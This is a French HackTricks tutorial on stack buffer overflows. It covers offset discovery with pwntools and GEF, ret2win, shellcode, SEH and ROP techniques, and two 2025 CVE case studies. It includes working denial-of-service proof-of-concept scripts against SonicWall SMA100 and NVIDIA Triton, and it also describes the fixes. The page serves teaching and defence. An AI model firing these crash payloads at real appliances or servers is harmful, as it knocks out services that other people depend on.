# Stack Overflow

{{#include ../../banners/hacktricks-training.md}}

## Qu'est-ce qu'un Stack Overflow

Un **stack overflow** est une vulnérabilité qui se produit lorsqu'un programme écrit plus de données sur la stack que l'espace qui lui a été alloué. Cet excès de données va **écraser l'espace mémoire adjacent**, entraînant la corruption de données valides, la perturbation du flux de contrôle et potentiellement l'exécution de code malveillant. Ce problème survient souvent à cause de l'utilisation de fonctions non sûres qui ne vérifient pas les limites des entrées.

Le principal problème de cet écrasement est que le **pointeur d'instruction sauvegardé (EIP/RIP)** et le **pointeur de base sauvegardé (EBP/RBP)** utilisés pour revenir à la fonction précédente sont **stockés sur la stack**. Par conséquent, un attaquant pourra écraser ces valeurs et **contrôler le flux d'exécution du programme**.

La vulnérabilité apparaît généralement parce qu'une fonction **copie sur la stack plus d'octets que la quantité qui lui a été allouée**, pouvant ainsi écraser d'autres parties de la stack.

Certaines fonctions couramment vulnérables sont : **`strcpy`, `strcat`, `sprintf`, `gets`**... De plus, des fonctions comme **`fgets`**, **`read`** et **`memcpy`** qui prennent un **argument de longueur** peuvent être utilisées de manière vulnérable si la longueur spécifiée est supérieure à celle allouée.

Par exemple, les fonctions suivantes pourraient être vulnérables :
```c
void vulnerable() {
char buffer[128];
printf("Enter some text: ");
gets(buffer); // This is where the vulnerability lies
printf("You entered: %s\n", buffer);
}
```
### Trouver les offsets de Stack Overflows

La méthode la plus courante pour détecter des Stack Overflows consiste à fournir une très grande entrée de `A`s (par ex. `python3 -c 'print("A"*1000)'`) et à observer un `Segmentation Fault` indiquant que l'**adresse `0x41414141` a été sollicitée**.

De plus, une fois que vous avez découvert qu'il y a une vulnérabilité de Stack Overflow, vous devrez trouver l'offset nécessaire pour pouvoir **overwrite the return address** ; pour cela on utilise généralement une **De Bruijn sequence.** Celle-ci, pour un alphabet donné de taille _k_ et des sous-séquences de longueur _n_, est une **séquence cyclique dans laquelle chaque sous-séquence possible de longueur _n_ apparaît exactement une fois** en tant que sous-séquence contiguë.

De cette façon, au lieu de devoir déterminer manuellement quel offset permet de contrôler l'EIP, on peut utiliser comme padding l'une de ces séquences puis trouver l'offset des octets qui ont fini par l'écraser.

Il est possible d'utiliser **pwntools** pour cela:
```python
from pwn import *

# Generate a De Bruijn sequence of length 1000 with an alphabet size of 256 (byte values)
pattern = cyclic(1000)

# This is an example value that you'd have found in the EIP/IP register upon crash
eip_value = p32(0x6161616c)
offset = cyclic_find(eip_value)  # Finds the offset of the sequence in the De Bruijn pattern
print(f"The offset is: {offset}")
```
ou **GEF**:
```bash
#Patterns
pattern create 200 #Generate length 200 pattern
pattern search "avaaawaa" #Search for the offset of that substring
pattern search $rsp #Search the offset given the content of $rsp
```
## Exploiter les Stack Overflows

Lors d'un overflow (si la taille est suffisante) vous pourrez **écraser** les valeurs des variables locales sur la stack jusqu'à atteindre les **EBP/RBP et EIP/RIP sauvegardés (ou même davantage)**.\
La manière la plus courante d'abuser de ce type de vulnérabilité est de **modifier l'adresse de retour** afin que, lorsque la fonction se termine, **le flux de contrôle soit redirigé vers l'endroit spécifié par ce pointeur**.

Cependant, dans d'autres scénarios, simplement **écraser certaines valeurs de variables sur la stack** peut suffire pour l'exploitation (comme dans des challenges CTF faciles).

### Ret2win

Dans ce type de challenges CTF, il existe une **fonction** **à l'intérieur** du binaire qui n'est **jamais appelée** et que **vous devez appeler pour gagner**. Pour ces challenges, il suffit de trouver l'**offset pour écraser l'adresse de retour** et **l'adresse de la fonction** à appeler (généralement [**ASLR**](../common-binary-protections-and-bypasses/aslr/index.html) sera désactivé) de sorte que, lorsque la fonction vulnérable retourne, la fonction cachée sera appelée :


{{#ref}}
ret2win/
{{#endref}}

### Stack Shellcode

Dans ce scénario, l'attaquant peut placer un shellcode dans la stack et utiliser l'EIP/RIP contrôlé pour sauter vers le shellcode et exécuter du code arbitraire :


{{#ref}}
stack-shellcode/
{{#endref}}

### Windows SEH-based exploitation (nSEH/SEH)

Sur Windows 32-bit, un overflow peut écraser la chaîne Structured Exception Handler (SEH) au lieu de l'adresse de retour sauvegardée. L'exploitation remplace typiquement le pointeur SEH par un gadget POP POP RET et utilise le champ nSEH de 4 octets pour un saut court afin de revenir dans le grand buffer où réside le shellcode. Un schéma courant est un petit jmp dans nSEH qui atterrit sur un near jmp de 5 octets placé juste avant nSEH pour sauter de centaines d'octets en arrière vers le début du payload.


{{#ref}}
windows-seh-overflow.md
{{#endref}}

### ROP & Ret2... techniques

Cette technique est le cadre fondamental pour bypasser la principale protection de la technique précédente : **No executable stack (NX)**. Elle permet aussi d'exécuter plusieurs autres techniques (ret2lib, ret2syscall...) qui finiront par exécuter des commandes arbitraires en abusant d'instructions existantes dans le binaire :


{{#ref}}
../rop-return-oriented-programing/
{{#endref}}

## Heap Overflows

Un overflow ne se situe pas toujours dans la stack ; il peut aussi se trouver dans le **heap**, par exemple :


{{#ref}}
../libc-heap/heap-overflow.md
{{#endref}}

## Types de protections

Il existe plusieurs protections visant à empêcher l'exploitation des vulnérabilités, consultez-les dans :


{{#ref}}
../common-binary-protections-and-bypasses/
{{#endref}}

### Real-World Example: CVE-2025-40596 (SonicWall SMA100)

Une bonne démonstration de pourquoi **`sscanf` ne doit jamais être utilisé pour analyser des entrées non fiables** est apparue en 2025 dans l'appliance SSL-VPN SMA100 de SonicWall.  
La routine vulnérable dans `/usr/src/EasyAccess/bin/httpd` tente d'extraire la version et l'endpoint de toute URI commençant par `/__api__/` :
```c
char version[3];
char endpoint[0x800] = {0};
/* simplified proto-type */
sscanf(uri, "%*[^/]/%2s/%s", version, endpoint);
```
1. La première conversion (`%2s`) stocke en toute sécurité **deux** bytes dans `version` (par ex. `"v1"`).
2. La seconde conversion (`%s`) **n'a pas de spécificateur de longueur**, donc `sscanf` continuera de copier **jusqu'au premier NUL byte**.
3. Parce que `endpoint` est situé sur la **stack** et fait **0x800 bytes**, fournir un path plus long que 0x800 bytes corrompt tout ce qui se trouve après le buffer ‑ y compris le **stack canary** et le **saved return address**.

Une preuve de concept en une seule ligne suffit à déclencher le crash **avant l'authentification** :
```python
import requests, warnings
warnings.filterwarnings('ignore')
url = "https://TARGET/__api__/v1/" + "A"*3000
requests.get(url, verify=False)
```
Même si les stack canaries provoquent l'arrêt du processus, un attaquant obtient toujours un primitive de **Denial-of-Service** (et, avec des leak d'information supplémentaires, éventuellement code-execution). La leçon est simple :

* Fournissez toujours une **largeur de champ maximale** (par ex. `%511s`).
* Préférez des alternatives plus sûres telles que `snprintf`/`strncpy_s`.

### Exemple réel : CVE-2025-23310 & CVE-2025-23311 (NVIDIA Triton Inference Server)

NVIDIA’s Triton Inference Server (≤ v25.06) contenait plusieurs **stack-based overflows** accessibles via son API HTTP.
Le motif vulnérable apparaissait à plusieurs reprises dans `http_server.cc` et `sagemaker_server.cc` :
```c
int n = evbuffer_peek(req->buffer_in, -1, NULL, NULL, 0);
if (n > 0) {
/* allocates 16 * n bytes on the stack */
struct evbuffer_iovec *v = (struct evbuffer_iovec *)
alloca(sizeof(struct evbuffer_iovec) * n);
...
}
```
1. `evbuffer_peek` (libevent) renvoie le **nombre de segments de buffer internes** qui composent le corps de la requête HTTP actuelle.
2. Chaque segment provoque l'allocation d'un `evbuffer_iovec` de **16-byte** sur la **stack** via `alloca()` – **sans aucune limite supérieure**.
3. En abusant de **HTTP _chunked transfer-encoding_**, un client peut forcer la requête à être découpée en **des centaines de milliers de 6-byte chunks** (`"1\r\nA\r\n"`). Cela fait croître `n` sans limite jusqu'à épuisement de la stack.

#### Preuve de concept (DoS)
```python
#!/usr/bin/env python3
import socket, sys

def exploit(host="localhost", port=8000, chunks=523_800):
s = socket.create_connection((host, port))
s.sendall((
f"POST /v2/models/add_sub/infer HTTP/1.1\r\n"
f"Host: {host}:{port}\r\n"
"Content-Type: application/octet-stream\r\n"
"Inference-Header-Content-Length: 0\r\n"
"Transfer-Encoding: chunked\r\n"
"Connection: close\r\n\r\n"
).encode())

for _ in range(chunks):                  # 6-byte chunk ➜ 16-byte alloc
s.send(b"1\r\nA\r\n")            # amplification factor ≈ 2.6x
s.sendall(b"0\r\n\r\n")               # end of chunks
s.close()

if __name__ == "__main__":
exploit(*sys.argv[1:])
```
Une requête d'environ ~3 Mo suffit à écraser l'adresse de retour sauvegardée et à **crash** le daemon sur une build par défaut.

#### Correctif et atténuation
La version 25.07 remplace l'allocation non sécurisée sur la pile par une **heap-backed `std::vector`** et gère proprement `std::bad_alloc` :
```c++
std::vector<evbuffer_iovec> v_vec;
try {
v_vec = std::vector<evbuffer_iovec>(n);
} catch (const std::bad_alloc &e) {
return TRITONSERVER_ErrorNew(TRITONSERVER_ERROR_INVALID_ARG, "alloc failed");
}
struct evbuffer_iovec *v = v_vec.data();
```
Leçons apprises :
* Ne jamais appeler `alloca()` avec des tailles contrôlées par l'attaquant.
* Les requêtes chunked peuvent modifier radicalement la structure des buffers côté serveur.
* Valider / plafonner toute valeur dérivée de l'entrée client *avant* de l'utiliser dans des allocations mémoire.

## Références
* [watchTowr Labs – Stack Overflows, Heap Overflows and Existential Dread (SonicWall SMA100)](https://labs.watchtowr.com/stack-overflows-heap-overflows-and-existential-dread-sonicwall-sma100-cve-2025-40596-cve-2025-40597-and-cve-2025-40598/)
* [Trail of Bits – Uncovering memory corruption in NVIDIA Triton](https://blog.trailofbits.com/2025/08/04/uncovering-memory-corruption-in-nvidia-triton-as-a-new-hire/)
* [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf)](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)

{{#include ../../banners/hacktricks-training.md}}
